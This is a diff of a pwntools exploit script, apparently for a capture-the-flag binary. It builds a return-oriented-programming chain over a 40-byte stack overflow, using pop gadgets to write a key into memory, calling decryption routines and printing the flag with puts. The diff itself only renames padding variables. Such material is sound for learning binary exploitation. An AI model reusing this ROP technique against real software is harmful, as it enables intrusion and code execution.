@@ -10,6 +10,7 @@ def get_gadget(elf: ELF, instructions: Union[list, tuple]) -> bytes:
 
 
 elf = ELF("./challenge", checksec=False)
+
 # TODO fin a way to call [] and `call` instructions
 gadget_popr14       = get_gadget(elf, ['pop r14', 'ret'])
 gadget_popr15       = get_gadget(elf, ['pop r15', 'ret'])
@@ -24,21 +25,21 @@ call_puts           = p64(0x00000000004008c1)
 key_char            = p64(ord('%'))
 
 b = cyclic(40)
-c = vulnerablefunc
+f = vulnerablefunc
 p = process("./challenge")
 
 # write % to key
 gogo = b''
-gogo += cyclic(40) + gadget_popr14 + key_global + c        # dest
-gogo += cyclic(40) + gadget_popr15 + key_char + c          # src
-gogo += cyclic(40) + gadget_loadr15inr14 + c + cyclic(8)   # src to dest
+gogo += b + gadget_popr14 + key_global + f        # dest
+gogo += b + gadget_popr15 + key_char + f          # src
+gogo += b + gadget_loadr15inr14 + f + cyclic(8)   # src to dest
 
 # decrypt files into global
-gogo += cyclic(40) + firstpart + c + cyclic(8)
-gogo += cyclic(40) + secondpart + c + cyclic(8)
+gogo += b + firstpart + f + cyclic(8)
+gogo += b + secondpart + f + cyclic(8)
 
 # print global
-gogo += cyclic(40) + gadget_poprdi + flag_global + call_puts
+gogo += b + gadget_poprdi + flag_global + call_puts
 
 p.sendline(gogo)
 
